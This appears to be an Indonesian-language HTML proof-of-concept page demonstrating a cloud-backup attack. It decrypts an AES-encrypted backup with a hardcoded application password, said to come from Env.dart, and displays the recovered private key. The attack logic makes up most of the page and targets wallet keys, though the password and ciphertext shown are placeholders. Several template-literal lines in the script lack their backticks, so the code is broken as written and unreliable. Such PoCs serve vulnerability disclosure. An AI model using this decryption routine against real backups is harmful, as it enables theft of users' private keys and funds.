<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PoC: Decrypt Cloud Backup</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
    <style>
        body { font-family: sans-serif; background: #0b0e11; color: #eaecef; padding: 20px; text-align: center; }
        .container { max-width: 450px; margin: auto; background: #1e2329; padding: 25px; border-radius: 12px; border: 1px solid #474d57; box-shadow: 0 4px 20px rgba(0,0,0,0.5); }
        .danger-zone { border: 1px solid #f44336; background: rgba(244, 67, 54, 0.05); padding: 15px; border-radius: 8px; margin-bottom: 20px; }
        #log { background: #000; color: #00ef8b; padding: 15px; border-radius: 8px; font-family: monospace; margin-top: 20px; text-align: left; min-height: 100px; font-size: 0.85em; white-space: pre-wrap; }
        .btn { background: #00ef8b; color: #000; border: none; padding: 15px; border-radius: 8px; font-weight: bold; cursor: pointer; width: 100%; margin-top: 15px; }
        .input-group { text-align: left; margin-bottom: 15px; }
        label { display: block; font-size: 0.8em; color: #848e9c; margin-bottom: 5px; }
        input, textarea { width: 100%; padding: 10px; border-radius: 5px; border: 1px solid #474d57; background: #2b3139; color: white; box-sizing: border-box; }
    </style>
</head>
<body>

<div class="container">
    <div class="danger-zone">
        <h3 style="color: #f44336; margin: 0;">Cloud Backup Exploit</h3>
        <p style="font-size: 0.8em; margin: 5px 0 0;">Mensimulasikan pencurian Private Key dari cadangan cloud.</p>
    </div>

    <div class="input-group">
        <label>Hardcoded Password (Ditemukan dari Env.dart):</label>
        <input type="text" id="globalPass" value="AES_PASSWORD_STALED_SECRET_HERE" readonly>
    </div>

    <div class="input-group">
        <label>Data Terenkripsi (Dari iCloud/Google Drive):</label>
        <textarea id="cipherText" rows="3">U2FsdGVkX19OitP5nS+A0L0pYjVvM1dGRXpYclhNMVF3S2M9</textarea>
    </div>
    
    <button class="btn" onclick="crackBackup()">DEKRIPSI CADANGAN SEKARANG</button>

    <div id="log">Status: Menunggu file cadangan...</div>
</div>

<script>
    function crackBackup() {
        const log = document.getElementById('log');
        const pass = document.getElementById('globalPass').value;
        const cipher = document.getElementById('cipherText').value;

        log.innerHTML = "Menghubungkan ke 'Virtual Cloud Storage'...<br>";
        log.innerHTML += "Mengunduh file cadangan... Selesai.<br>";
        log.innerHTML += "Mencoba dekripsi dengan kunci global aplikasi...<br>";

        setTimeout(() => {
            try {
                // Simulasi dekripsi menggunakan password statis yang ditemukan di kode sumber
                const decrypted = CryptoJS.AES.decrypt(cipher, pass).toString(CryptoJS.enc.Utf8);

                if (decrypted) {
                    log.innerHTML += <br><span style="color:#fff;">[SUCCESS] DATA TERDEKRIPSI:</span><br>;
                    log.innerHTML += <span style="color:#f0b90b; font-size: 1.2em; font-weight: bold;">${decrypted}</span><br>;
                    log.innerHTML += <br><span style="color:#f44336;">Bahaya: Penyerang yang memiliki akses cloud dapat mencuri Private Key ini dengan mudah.</span>;
                } else {
                    log.innerHTML += "<br>[FAILED] Gagal dekripsi. Data rusak atau kunci tidak cocok.";
                }
            } catch (e) {
                log.innerHTML += "<br>[ERROR] Terjadi kesalahan teknis saat dekripsi.";
            }
        }, 800);
    }
</script>

</body>
</html>
